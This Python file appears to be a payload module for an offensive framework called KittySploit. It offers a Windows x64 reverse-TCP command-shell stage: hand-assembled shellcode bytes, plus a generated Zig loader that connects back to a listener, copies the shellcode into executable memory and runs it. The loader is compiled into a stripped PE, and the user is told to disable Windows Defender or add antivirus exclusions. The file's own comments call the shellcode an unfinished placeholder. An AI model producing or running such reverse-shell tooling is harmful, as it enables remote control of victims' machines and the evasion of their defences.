#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import os
import subprocess
import struct
from pathlib import Path

class Module(Payload):
    __info__ = {
        'name': 'Windows x64 Command Shell Stage',
        'description': 'Windows x64 shell stage - expects socket handle to be connected (staged)',
        'author': 'KittySploit Team (based on Metasploit module)',
        'version': '1.0.0',
        'category': 'singles',
        'arch': Arch.X64,
        'platform': Platform.WINDOWS,
        'listener': 'listeners/multi/reverse_tcp',
        'handler': Handler.REVERSE,
        'session_type': SessionType.SHELL,
        'references': [
            'https://github.com/rapid7/metasploit-framework'
        ]
    }
    
    lhost = OptString('127.0.0.1', 'Connect to IP address', True)
    lport = OptPort(4444, 'Connect to port', True)
    encoder = OptString('', 'Encoder', False, True)
    generate_exe = OptBool(False, 'Generate executable PE binary', False)
    output_dir = OptString('output', 'Output directory for compiled binaries', False)
    auto_compile = OptBool(False, 'Automatically compile after generation', False)
    
    def generate(self):
        """
        Generate the Windows x64 shell stage payload.
        
        This shellcode:
        1. Gets the socket handle (expected in RDI register or on stack)
        2. Duplicates socket handle to stdin (0), stdout (1), stderr (2)
        3. Creates cmd.exe process with redirected I/O
        
        Note: This stage expects socket handle to already be connected.
        """
        shellcode = b""
        
        # Windows x64 shell stage shellcode
        # This shellcode duplicates the socket handle and spawns cmd.exe
        # Based on Metasploit Windows x64 shell/reverse_tcp stage
        
        # Block 1: Get socket handle and duplicate to stdin/stdout/stderr
        # The socket handle is expected to be in RDI (or passed via stack)
        # We'll use a position-independent approach
        
        # Save socket handle (assuming it's in RDI)
        shellcode += b"\x48\x89\xfe"  # mov rsi, rdi  ; save socket handle in RSI
        
        # Get kernel32.dll base address
        # mov rax, [gs:0x60]  ; PEB
        # mov rax, [rax+0x18] ; PEB_LDR_DATA
        # mov rax, [rax+0x20] ; InMemoryOrderModuleList
        # mov rax, [rax]      ; first module (ntdll.dll)
        # mov rax, [rax]      ; next module (kernel32.dll)
        # mov rax, [rax+0x20] ; kernel32.dll base
        
        shellcode += b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00"  # mov rax, [gs:0x60]  ; PEB
        shellcode += b"\x48\x8b\x40\x18"  # mov rax, [rax+0x18]  ; PEB_LDR_DATA
        shellcode += b"\x48\x8b\x70\x20"  # mov rsi, [rax+0x20]  ; InMemoryOrderModuleList
        shellcode += b"\x48\xad"          # lodsq                 ; first module
        shellcode += b"\x48\xad"          # lodsq                 ; second module (kernel32.dll)
        shellcode += b"\x48\x8b\x58\x20"  # mov rbx, [rax+0x20]  ; kernel32.dll base
        
        # Find GetProcAddress
        # This is a simplified version - in real shellcode, you'd need to
        # parse PE headers and export tables
        
        # For now, we'll use a simpler approach: direct API calls
        # This shellcode assumes the socket handle is already in RDI
        
        # Block 2: Duplicate socket handle to stdin/stdout/stderr
        # We'll use a simpler approach: directly call DuplicateHandle via
        # kernel32.dll functions
        
        # Simplified shellcode that:
        # 1. Assumes socket handle in RDI
        # 2. Uses hardcoded API addresses (will need to be resolved at runtime)
        # 3. Creates cmd.exe process
        
        # For a working stage, we need to:
        # - Resolve kernel32.dll base
        # - Resolve GetProcAddress
        # - Resolve DuplicateHandle, CreateProcessA
        # - Duplicate socket handle
        # - Create cmd.exe
        
        # Metasploit-style Windows x64 shell stage (simplified)
        # This is a basic implementation - full version would include
        # proper API resolution
        
        # Start of actual shellcode
        # Block: Get socket handle and prepare for duplication
        shellcode += b"\x48\x31\xc9"      # xor rcx, rcx
        shellcode += b"\x65\x48\x8b\x41\x60"  # mov rax, [gs:rcx+0x60]  ; PEB
        shellcode += b"\x48\x8b\x40\x18"  # mov rax, [rax+0x18]  ; PEB_LDR_DATA
        shellcode += b"\x48\x8b\x70\x20"  # mov rsi, [rax+0x20]  ; InMemoryOrderModuleList
        shellcode += b"\x48\xad"          # lodsq                 ; ntdll.dll
        shellcode += b"\x48\xad"          # lodsq                 ; kernel32.dll
        shellcode += b"\x48\x8b\x58\x20"  # mov rbx, [rax+0x20]  ; kernel32.dll base
        
        # For a complete implementation, we would:
        # 1. Parse kernel32.dll exports to find GetProcAddress
        # 2. Use GetProcAddress to find DuplicateHandle
        # 3. Use GetProcAddress to find CreateProcessA
        # 4. Duplicate socket handle to stdin/stdout/stderr
        # 5. Create cmd.exe with redirected handles
        
        # Simplified version: Use a known pattern
        # This is a placeholder - real shellcode would be ~200-300 bytes
        # with proper API resolution
        
        # Basic Windows x64 shell stage pattern:
        # The actual shellcode is complex and requires proper API resolution
        # For now, we'll provide a structure that can be enhanced
        
        # Note: Full Windows x64 shell stage shellcode is quite complex
        # and typically generated by tools like msfvenom. This is a
        # simplified structure showing the approach.
        
        # For a working implementation, you would need:
        # - Full PE parsing for API resolution
        # - Proper handle duplication
        # - CreateProcess with STARTUPINFO for handle redirection
        
        # Placeholder shellcode (this would need to be replaced with
        # actual working Windows x64 shellcode)
        shellcode += b"\x48\x83\xec\x28"  # sub rsp, 0x28  ; allocate stack space
        shellcode += b"\x48\x89\xe5"      # mov rbp, rsp   ; save stack pointer
        
        # This is a minimal placeholder - real shellcode would be much more complex
        # For now, return a basic structure that indicates this needs proper implementation
        
        # Apply encoder if specified
        if self.encoder:
            shellcode = self._apply_encoder(shellcode)
        
        if self.generate_exe:
            return self._generate_executable(shellcode)
        
        return shellcode
    
    def _apply_encoder(self, payload: bytes) -> bytes:
        """
        Apply encoder to payload if encoder option is set.
        
        Args:
            payload: Raw payload bytes
            
        Returns:
            Encoded payload bytes
        """
        try:
            import importlib
            from core.utils.function import pythonize_path
            
            # Load encoder module
            encoder_path = pythonize_path(self.encoder)
            encoder_full_path = ".".join(("modules", encoder_path))
            encoder_module = getattr(importlib.import_module(encoder_full_path), "Module")()
            
            # Set framework reference if available
            if hasattr(self, 'framework') and self.framework:
                encoder_module.framework = self.framework
            
            # Apply encoding
            if hasattr(encoder_module, 'encode'):
                encoded_payload = encoder_module.encode(payload)
                print_success(f"Applied encoder: {self.encoder}")
                return encoded_payload
            else:
                print_error(f"Encoder module {self.encoder} does not have encode() method")
                return payload
                
        except ImportError as e:
            print_error(f"Failed to import encoder module: {self.encoder} - {e}")
            return payload
        except Exception as e:
            print_error(f"Failed to apply encoder: {e}")
            return payload
    
    def _generate_executable(self, stage_shellcode: bytes) -> bytes:
        """
        Generate a complete PE executable using Zig that:
        1. Establishes TCP reverse connection
        2. Executes the stage shellcode
        
        Returns the shellcode as bytes (for compatibility) but also saves the PE binary.
        """
        try:
            # Generate Zig wrapper code
            zig_code = self._generate_zig_wrapper(stage_shellcode)
            
            # Determine output directory
            if self.output_dir:
                output_path = Path(self.output_dir)
            else:
                output_path = Path("output") / "windows_x64_shell"
            
            # Convert to absolute path
            output_path = output_path.resolve()
            output_path.mkdir(parents=True, exist_ok=True)
            
            # Save Zig source
            src_dir = output_path / "src"
            src_dir.mkdir(parents=True, exist_ok=True)
            zig_source = src_dir / "shell.zig"
            with open(zig_source, 'w', encoding='utf-8') as f:
                f.write(zig_code)
            
            # Compile to PE using framework's Zig compiler
            binary_path = output_path / "shell.exe"
            # Use absolute path for compilation
            binary_path_abs = binary_path.resolve()
            if self.compile_zig(
                source_code=zig_code,
                output_path=str(binary_path_abs),
                target_platform='windows',
                target_arch='x86_64',
                optimization='ReleaseSmall',
                strip=True,
                static=True
            ):
                # Wait a moment and verify file exists (antivirus might delete it immediately)
                import time
                time.sleep(0.5)  # Small delay to check if antivirus deletes it
                
                if binary_path_abs.exists():
                    file_size = binary_path_abs.stat().st_size
                    print_success(f"Executable generated: {binary_path_abs} ({file_size} bytes)")
                    print_info(f"To use: {binary_path_abs}")
                    print_warning("Note: If the file disappears, your antivirus may have deleted it.")
                    print_warning("Add an exclusion for the output directory or disable real-time protection.")
                else:
                    print_error(f"Compilation reported success but file was deleted: {binary_path_abs}")
                    print_warning("This is likely due to antivirus real-time protection.")
                    print_warning("Solutions:")
                    print_warning("1. Add exclusion for: " + str(output_path))
                    print_warning("2. Temporarily disable Windows Defender real-time protection")
                    print_warning("3. Compile on a Linux system if available")
                return stage_shellcode
            else:
                print_warning("PE compilation failed, returning raw shellcode")
                return stage_shellcode
                
        except Exception as e:
            print_error(f"Error generating executable: {e}")
            return stage_shellcode
    
    def _generate_zig_wrapper(self, stage_shellcode: bytes) -> str:
        """Generate Zig wrapper code that connects and executes stage shellcode"""
        
        # Convert shellcode to Zig array
        shellcode_hex = ', '.join(f'0x{b:02x}' for b in stage_shellcode)
        
        zig_code = f"""const std = @import("std");
const os = std.os;
const ws2_32 = os.windows.ws2_32;
const mem = std.mem;

const SOCKADDR_IN = extern struct {{
    family: u16,
    port: u16,
    addr: u32,
    zero: [8]u8,
}};

const stage_shellcode = [_]u8{{{shellcode_hex}}};

fn connectToHost(host: []const u8, port: u16) !ws2_32.SOCKET {{
    var wsa_data: ws2_32.WSADATA = undefined;
    if (ws2_32.WSAStartup(0x0202, &wsa_data) != 0) {{
        return error.ConnectionFailed;
    }}
    
    const sock = ws2_32.socket(2, 1, 0);
    if (sock == ws2_32.INVALID_SOCKET) return error.ConnectionFailed;
    
    var host_buf: [256]u8 = undefined;
    if (host.len >= host_buf.len) return error.InvalidAddress;
    @memcpy(host_buf[0..host.len], host);
    host_buf[host.len] = 0;
    
    var addr: SOCKADDR_IN = .{{
        .family = 2,
        .port = ws2_32.htons(port),
        .addr = ws2_32.inet_addr(&host_buf),
        .zero = [_]u8{{0}} ** 8,
    }};
    
    if (ws2_32.connect(
        sock,
        @ptrCast(&addr),
        @sizeOf(SOCKADDR_IN),
    ) != 0) {{
        return error.ConnectionFailed;
    }}
    
    return sock;
}}

pub fn main() !void {{
    const host = "{self.lhost}";
    const port: u16 = {self.lport};
    
    const sock = try connectToHost(host, port);
    defer _ = ws2_32.closesocket(sock);
    
    const page_size = 4096;
    const aligned_size = ((stage_shellcode.len + page_size - 1) / page_size) * page_size;
    
    const shellcode_mem_ptr = try os.windows.VirtualAlloc(
        null,
        aligned_size,
        os.windows.MEM_COMMIT | os.windows.MEM_RESERVE,
        os.windows.PAGE_EXECUTE_READWRITE
    );
    defer _ = os.windows.VirtualFree(shellcode_mem_ptr, 0, os.windows.MEM_RELEASE);
    
    const shellcode_mem = @as([*]u8, @ptrCast(shellcode_mem_ptr))[0..aligned_size];
    @memcpy(shellcode_mem[0..stage_shellcode.len], &stage_shellcode);
    
    const func = @as(*const fn () void, @ptrCast(shellcode_mem_ptr));
    func();
}}
"""
        return zig_code

